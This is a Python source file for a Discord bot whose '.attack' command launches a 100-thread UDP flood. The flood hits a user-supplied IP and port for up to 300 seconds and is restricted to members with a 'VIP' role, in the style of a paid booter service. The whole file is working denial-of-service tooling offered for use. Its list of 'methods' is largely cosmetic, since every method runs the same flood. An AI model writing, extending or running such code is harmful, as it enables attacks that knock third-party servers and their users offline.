import discord
from discord.ext import commands
import threading
import socket
import time
import json
import os

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='.', intents=intents)

VALID_METHODS = [
    "UDP-VSE", "UDPGOOD", "UDPRAW", "UDPGAME",
    "UDPHEX", "MCPE", "TCPBYPASS", "UDPBYPASS"
]

MAX_THREADS = 100
PAYLOAD_SIZE = 65500

def is_valid_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def send_udp_flood(ip, port, duration):
    timeout = time.time() + duration
    payload = os.urandom(PAYLOAD_SIZE)

    def flood():
        while time.time() < timeout:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(payload, (ip, port))
                s.close()
            except:
                pass

    threads = []
    for _ in range(MAX_THREADS):
        t = threading.Thread(target=flood)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

@bot.command()
async def attack(ctx, ip=None, port=None, method=None, duration=None):
    if not all([ip, port, method, duration]):
        await ctx.send("Usage: `.attack <ip> <port> <method> <duration>`")
        return

    if not any(role.name == "VIP" for role in ctx.author.roles):
        await ctx.send("Permission denied. Only VIP users can use this command.")
        return

    if not is_valid_ip(ip):
        await ctx.send("Invalid IP address.")
        return

    try:
        port = int(port)
        duration = int(duration)
        if port < 1 or port > 65535 or duration < 1 or duration > 300:
            raise ValueError
    except:
        await ctx.send("Port must be 1–65535 and duration 1–300 seconds.")
        return

    if method.upper() not in VALID_METHODS:
        await ctx.send(f"Invalid method. Use `.methods` to see valid methods.")
        return

    # Launch attack
    threading.Thread(target=send_udp_flood, args=(ip, port, duration)).start()

    attack_data = {
        "status": "success",
        "message": "Attack sent successfully",
        "attack_log": {
            "username": str(ctx.author),
            "service": "Apsx Services",
            "host": ip,
            "port": port,
            "time": f"{duration} seconds",
            "method": method.upper(),
            "handlers": "Node (4), Node (1)"
        }
    }

    await ctx.send("```json\n" + json.dumps(attack_data, indent=4) + "\n```")

@bot.command()
async def methods(ctx):
    await ctx.send("**Available methods:**\n" + "\n".join(VALID_METHODS))

bot.run("YOUR_DISCORD_BOT_TOKEN")
